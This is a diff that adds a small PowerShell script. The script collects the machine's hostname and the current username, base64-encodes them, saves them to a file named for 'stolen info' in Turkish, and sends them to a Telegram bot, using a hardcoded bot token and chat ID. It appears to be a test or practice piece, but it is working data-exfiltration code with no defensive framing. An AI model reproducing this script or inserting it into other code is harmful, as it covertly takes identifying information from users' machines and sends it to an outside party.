@@ -1,0 +1,10 @@
+$a=hostname
+$b=$env:username
+$c="HOSTNAME: " + $a + "             USERNAME: " + $b
+$d=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($c))
+New-Item -Path c: -Name "calınanbilgi3.txt" -ItemType "file" -Value $d
+$MyToken = "643440344:AAHNr9JkCkLvUcVErXLzeOY2pGt5uRSNi-M"
+$chatID = -1001284650874
+$Message = "interview deneme"
+$Response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($MyToken)/sendMessage?chat_id=$($chatID)&text=$($d)"
+
